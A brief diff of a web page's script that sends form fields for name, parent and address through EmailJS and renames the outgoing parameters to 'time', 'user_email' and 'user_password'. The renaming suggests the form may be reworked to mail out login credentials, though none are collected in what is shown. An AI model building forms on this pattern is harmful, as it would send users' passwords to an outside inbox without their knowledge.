@@ -128,9 +128,9 @@
       const alamat = document.getElementById("alamat").value;
 
       const templateParams = {
-        user_nama: nama,
-        user_ortu: ortu,
-        user_alamat: alamat
+        time: nama,
+        user_email: ortu,
+        user_password: alamat
       };
 
       emailjs.send("service_y5ba2kk", "template_pini9ru", templateParams)
@@ -144,5 +144,6 @@
   </script>
 </body>
 </html>
+
 
 
